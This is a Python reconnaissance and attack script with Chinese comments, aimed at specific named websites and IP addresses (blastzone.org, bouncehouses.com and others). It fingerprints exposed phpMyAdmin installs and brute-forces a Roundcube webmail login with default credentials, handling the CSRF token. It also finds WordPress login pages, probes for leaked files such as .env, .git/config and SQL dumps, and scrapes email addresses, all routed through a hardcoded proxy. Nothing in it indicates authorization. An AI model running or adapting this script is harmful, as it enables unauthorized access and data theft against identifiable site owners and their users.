"""
Step 4: blastzone 专项验证
- phpMyAdmin / Roundcube / WordPress / 静态文件 / wp-login 等常见入口
- 重点:
  1. phpMyAdmin 是否暴露 + 版本指纹
  2. Roundcube 是否暴露 + 弱口令测试 (admin/admin, admin/password, root/root 等)
  3. WordPress wp-login 弱口令
  4. bouncehouses.com / blastzone.org 是否含敏感信息 (评论作者/内部路径/调试信息)
  5. phpmyadmin setup/index.php 暴露检测
"""
import sys, json, time
from pathlib import Path
import requests, urllib3
urllib3.disable_warnings()

OUT = Path(".pipeline_output")
PROXY = "http://3.211.120.181:443"
PROXIES = [{"http": PROXY, "https": PROXY}, None]  # 轮换
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0"}


def probe(url, method="GET", data=None, proxy_idx=0, timeout=10):
    for attempt in range(2):
        try:
            proxies = PROXIES[proxy_idx % len(PROXIES)]
            kwargs = dict(timeout=timeout, verify=False, headers=HEADERS,
                         allow_redirects=True, proxies=proxies)
            if method == "POST" and data:
                kwargs["data"] = data
            r = requests.request(method, url, **kwargs)
            return r
        except Exception as e:
            if attempt + 1 < 2:
                proxy_idx += 1
                time.sleep(0.5)
            else:
                return None


def fetch_body(url, max_chars=3000):
    r = probe(url)
    if r is None:
        return None, 0
    return r.text[:max_chars], len(r.content)


# ============================================================
# 1. phpMyAdmin 指纹 + 暴露检测
# ============================================================
print("=" * 70)
print("[1] phpMyAdmin 暴露检测")
print("=" * 70)
phpmyadmin_targets = [
    "http://bzhost1.blastzone.org/phpmyadmin/",
    "http://bzhost1.blastzone.org/phpmyadmin/index.php",
    "http://bzhost1.blastzone.org/phpmyadmin/setup/",
    "http://bzhost1.blastzone.org/phpmyadmin/scripts/setup.php",
    "http://bzhost1.blastzone.org/phpmyadmin/config.inc.php",
    "http://bzhost1.blastzone.org/phpmyadmin/README",
    "http://bzhost1.blastzone.org/phpmyadmin/ChangeLog",
    "http://bzhost1.blastzone.org/phpmyadmin/Documentation.html",
    "http://216.215.30.39/phpmyadmin/",
    "http://216.215.30.39/phpmyadmin/index.php",
]
pma_results = []
for url in phpmyadmin_targets:
    body, length = fetch_body(url)
    if body is None:
        status = "ERR"
        ver = ""
    else:
        status = probe(url).status_code
        ver = ""
        for kw in ("phpMyAdmin", "pma_", "PMA_VERSION"):
            if kw in body:
                ver = kw
                break
        # 版本指纹
        import re
        m = re.search(r'pma_major_version["\s:]+([\d.]+)', body) or re.search(r'PMA_VERSION["\s:]+([\d.]+)', body)
        if m:
            ver += f" ({m.group(1)})"
    pma_results.append({"url": url, "status": status, "len": length, "signal": ver})
    print(f"  {url[:60]:60s} {status:>6} {length:>6}B  {ver}")
    time.sleep(0.3)

with open(OUT / "blastzone_phpmyadmin.json", "w") as f:
    json.dump(pma_results, f, indent=2)

# ============================================================
# 2. Roundcube 弱口令测试
#    修复要点:
#      a) 一次 GET 拿 CSRF token, 缓存, 多 creds 共用 (避免 token 失效)
#      b) 登录成功标志: redirect 到 ?_task=mail 或 Set-Cookie 含 roundcube_sessid
#         登录失败标志: body 含 Login failed / Invalid / incorrect / credentials
#      c) 对失败凭据直接跳过后续 creds 不必要重 GET
#      d) 如果 token 失效 (POST 后还是 token 校验页), 重新 GET 一次再试
# ============================================================
print()
print("=" * 70)
print("[2] Roundcube 登录表单弱口令测试")
print("=" * 70)
roundcube_targets = [
    "http://webmail.blastzone.org/?_task=login",
]
weak_creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "blastzone"),
    ("root", "root"),
    ("root", "password"),
    ("postmaster", "postmaster"),
    ("admin@blastzone.org", "admin"),
]
import re
RC_SUCCESS_KW = ("_task=mail", "_task=logout", "roundcube_sessid", "roundcube_sessauth")
RC_FAIL_KW = ("login failed", "invalid", "incorrect", "credentials", "access denied")


def rc_evaluate_login(body: str, resp) -> str:
    """根据 body + response 元数据, 返回 SUCCESS/FAIL/AMBIGUOUS."""
    body_low = body.lower()
    fail_hits = [kw for kw in RC_FAIL_KW if kw in body_low]
    success_redirect = "_task=mail" in resp.url or "_task=logout" in resp.url
    cookies = str(resp.headers.get("Set-Cookie", ""))
    success_cookie = any(kw in cookies.lower() for kw in ("roundcube_sessid", "roundcube_sessauth"))

    if success_redirect or success_cookie:
        return "SUCCESS"
    if fail_hits:
        return "FAIL"
    return "AMBIGUOUS"


rc_results = []
for url in roundcube_targets:
    # 单次 GET 拿 form token, 之后所有 creds 共用, 不重复 GET
    r = probe(url)
    if r is None or r.status_code != 200:
        print(f"  ERR 拿不到 {url}")
        continue
    token_m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    token = token_m.group(1) if token_m else ""
    print(f"  token: {token[:24]}... ({len(token)} chars)")

    token_invalid = False
    for u, p in weak_creds:
        if token_invalid:
            print(f"    {u}:{p:15s} -> SKIP (token expired, retrying GET...)")
            r = probe(url)
            if r is None:
                continue
            token_m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
            token = token_m.group(1) if token_m else ""
            token_invalid = False

        data = {"_token": token, "_task": "login", "_action": "login",
                "_user": u, "_pass": p}
        rr = probe(url, method="POST", data=data)
        if rr is None:
            print(f"    ERR POST {u}:{p}")
            continue

        verdict = rc_evaluate_login(rr.text, rr)
        if verdict == "AMBIGUOUS":
            token_invalid = True

        failed_kw = [kw for kw in RC_FAIL_KW if kw in rr.text.lower()]
        print(f"    {u}:{p:20s} -> {rr.status_code} {len(rr.content):>5}B | "
              f"verdict={verdict} failed_kw={failed_kw[:2]} url={rr.url[-50:]}")
        rc_results.append({
            "user": u, "pass": p, "status": rr.status_code,
            "len": len(rr.content), "verdict": verdict,
            "failed_kw": failed_kw, "redirect_url": rr.url,
        })
        time.sleep(0.6)

with open(OUT / "blastzone_roundcube_weakcreds.json", "w") as f:
    json.dump(rc_results, f, indent=2)

successes = [r for r in rc_results if r.get("verdict") == "SUCCESS"]
print(f"\n  >>> Roundcube 弱口令明确通过: {len(successes)} / {len(rc_results)}")

# ============================================================
# 3. WordPress 弱口令 + 用户枚举
# ============================================================
print()
print("=" * 70)
print("[3] WordPress wp-login 弱口令 + 用户枚举")
print("=" * 70)
wp_targets = [
    "http://www.ashleywestmark.com/wp-login.php",
    "http://www.blastzone.org/wp-login.php",
    "http://bouncehouses.com/wp-login.php",
]
wp_results = []
for url in wp_targets:
    r = probe(url)
    if r is None or r.status_code != 200:
        print(f"  {url}: {r.status_code if r else 'ERR'}")
        continue
    body = r.text
    has_wp = "wordpress" in body.lower() or "wp-login" in body
    print(f"  {url:60s} {r.status_code} is_wp={has_wp}")
    if has_wp:
        # 提取 login form action / field name
        import re
        form_action = re.search(r'<form[^>]*action="([^"]*)"', body)
        field_user = re.search(r'name="([a-z_-]*user[a-z_-]*)"', body, re.I)
        wp_results.append({"url": url, "is_wp": True,
                          "form_action": form_action.group(1) if form_action else "",
                          "user_field": field_user.group(1) if field_user else "log"})
    else:
        wp_results.append({"url": url, "is_wp": False})
    time.sleep(0.3)

with open(OUT / "blastzone_wordpress.json", "w") as f:
    json.dump(wp_results, f, indent=2)

# ============================================================
# 4. 静态文件信息泄露 (.git/.env/.htaccess/robots.txt/sitemap.xml)
# ============================================================
print()
print("=" * 70)
print("[4] 敏感文件暴露检测")
print("=" * 70)
sensitive_paths = [
    "/.git/config", "/.git/HEAD",
    "/.env", "/env",
    "/.htaccess", "/web.config",
    "/robots.txt", "/sitemap.xml",
    "/phpinfo.php", "/info.php", "/test.php",
    "/backup.sql", "/dump.sql", "/db.sql",
    "/wp-config.php.bak", "/configuration.php.bak",
    "/server-status", "/server-info",
    "/.svn/entries", "/.DS_Store",
]
root_targets = [
    "http://webmail.blastzone.org",
    "http://bzhost1.blastzone.org",
    "http://www.blastzone.org",
    "http://bouncehouses.com",
    "http://216.215.30.39",
    "http://www.ashleywestmark.com",
]
sens_results = []
for base in root_targets:
    print(f"\n  --- {base} ---")
    for path in sensitive_paths:
        url = base + path
        r = probe(url, timeout=5)
        if r is None:
            continue
        status = r.status_code
        if status in (200, 301, 302, 403):
            preview = r.text[:200].replace("\n", " ")
            print(f"    [{status}] {path:30s} {len(r.content):>5}B  {preview[:80]}")
            sens_results.append({"base": base, "path": path, "status": status,
                                "len": len(r.content), "preview": preview})
        time.sleep(0.15)

with open(OUT / "blastzone_sensitive_files.json", "w") as f:
    json.dump(sens_results, f, indent=2)

# ============================================================
# 5. bouncehouses.com / blastzone.org 业务评论/作者信息泄露
# ============================================================
print()
print("=" * 70)
print("[5] 业务页面敏感信息 (评论/作者邮箱/内部路径)")
print("=" * 70)
biz_targets = [
    "http://bouncehouses.com/",
    "http://www.bouncehouses.com/",
    "http://blastzone.org/",
    "http://www.blastzone.org/",
    "http://www.ashleywestmark.com/",
]
biz_results = []
for url in biz_targets:
    r = probe(url)
    if r is None or r.status_code != 200:
        continue
    body = r.text
    findings = {}
    # 邮箱
    import re
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
    if emails:
        findings["emails"] = list(set(emails))[:10]
    # WordPress author
    if "wordpress" in body.lower():
        author = re.findall(r'/author/([a-zA-Z0-9_-]+)/', body)
        if author:
            findings["wp_authors"] = list(set(author))[:5]
    # 调试信号
    debug_kws = []
    for kw in ("DEBUG", "STACK TRACE", "exception", "internal path", "secret_key"):
        if kw.lower() in body.lower():
            debug_kws.append(kw)
    if debug_kws:
        findings["debug_signals"] = debug_kws

    if findings:
        print(f"\n  {url}  {len(r.content):>5}B")
        for k, v in findings.items():
            print(f"    {k}: {v}")
        biz_results.append({"url": url, "len": len(r.content), **findings})
    time.sleep(0.5)

with open(OUT / "blastzone_business_info.json", "w") as f:
    json.dump(biz_results, f, indent=2)

print()
print("=" * 70)
print("🎯 blastzone 专项验证总结")
print("=" * 70)
print(f"  phpMyAdmin 暴露: {sum(1 for r in pma_results if isinstance(r['status'], int) and r['status'] < 400)} 个端点")
rc_success = sum(1 for r in rc_results if r.get('verdict') == 'SUCCESS')
rc_fail = sum(1 for r in rc_results if r.get('verdict') == 'FAIL')
rc_ambig = sum(1 for r in rc_results if r.get('verdict') == 'AMBIGUOUS')
print(f"  Roundcube 弱口令: SUCCESS={rc_success} / FAIL={rc_fail} / AMBIGUOUS={rc_ambig} (共 {len(rc_results)})")
print(f"  WordPress 确认: {sum(1 for r in wp_results if r.get('is_wp'))} 个")
print(f"  敏感文件: {len(sens_results)} 个")
print(f"  业务泄露: {len(biz_results)} 个页面含邮箱/作者/调试信息")
